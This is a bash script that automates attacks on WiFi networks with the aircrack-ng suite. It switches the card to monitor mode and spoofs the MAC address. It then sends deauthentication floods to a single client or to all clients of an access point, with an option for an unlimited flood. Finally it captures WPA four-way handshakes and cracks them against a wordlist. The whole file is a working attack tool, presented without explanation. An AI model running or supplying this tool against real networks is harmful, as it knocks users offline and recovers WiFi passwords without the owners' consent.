#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 3/5/2020
#Last Modified Date: 3/14/2020
clear

if [[ ${UID} -ne 0 ]]; then
echo "Please run script as root or sudo" 
exit 1
fi
wifi=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo airmon-ng start $wifi 
clear
wlan0=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up
exec xterm -e sudo airodump-ng $wlan0 &
echo
echo "What channel to use for the attack?"
read CH
exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
clear
echo
info () {
read -p "BSSID:" BSSID
read -p "ESSID:" ESSID
read -p "STATION:" STATION
read -p "Deauth Count:" COUNT
}

deauthsingle () {
if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
exec xterm -e sudo aireplay-ng --deauth $COUNT -a $BSSID -e $ESSID -c $STATION $wlan0 &
else
sudo aireplay-ng --deauth $COUNT -a $BSSID -e $ESSID -c $STATION $wlan0
fi
sleep 3; clear
}

deauthall () {
read -p "BSSID:" BSSID
read -p "Deauth Count:" COUNT
if [[ $COUNT = 0 ]]; then echo "0 count equates to infinite deauth, press Ctrl-c to cancel"; sleep 3
exec xterm -e sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0 &
else
sudo aireplay-ng --deauth $COUNT -a $BSSID $wlan0
fi
sleep 3; clear
}

handshake () {
read -p "Name of the Handshake:" HAND
xterm -hold -e sudo airodump-ng -c $CH --bssid $BSSID -w $HAND $wlan0 &
sleep 6
xterm -e sudo aireplay-ng --deauth $COUNT -a $BSSID -e $ESSID -c $STATION $wlan0; exit 0 &
sleep 6
killall xterm
if [[ -d $HOME/handshake ]]; then
mv $HAND*.cap $HOME/handshake/
mv $HAND*.kismet.csv $HOME/handshake/
else mkdir $HOME/handshake && mv $HAND*.cap $HAND*.kismet.csv $HOME/handshake/
fi
rm -i $HAND*
sleep 2; clear
}

channelchange () {
echo "What channel to use for the attack?"
read CH
exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
}

crack () {
clear
cd $HOME/handshake
ls
echo
read -p "Name of captured packet to crack:" PACKET
read -p "Name of kismet.csv:" KISMET
read -p "Path of the wordlist:" WORD
BSSID=$(cat $KISMET | awk -F "," '{ print $1 }' | cut -d ";" -f 4 | tail -1)
ESSID=$(cat $KISMET | awk -F "," '{ print $1 }' | cut -d ";" -f 3 | tail -1)
exec xterm -hold -e aircrack-ng -e $ESSID -b $BSSID -w $WORD $PACKET &
sudo airmon-ng stop $wlan0
sudo ip link set $wifi down && sudo ip link set $wifi up
clear
}

while true; do
echo -e "\t \t\e[92mWHAT WOULD YOU LIKE TO DO?\e[0m"
echo
echo "1.Deauth a single client"
echo "2.Deauth all clients"
echo "3.Change Channel"
echo "4.Capture 4 way handshake" 
echo "5.Crack"
echo "6.Exit"
read -p "#:" input
clear
case $input in
1) info; deauthsingle;;
2) deauthall;;
3) channelchange;;
4) info; handshake;;
5) crack;;
6) break;;
*) echo "Wrong entry"; sleep 3; clear;;
esac
done
killall xterm
sudo airmon-ng stop $wlan0
sudo ip link set $wifi down && sudo ip link set $wifi up
clear
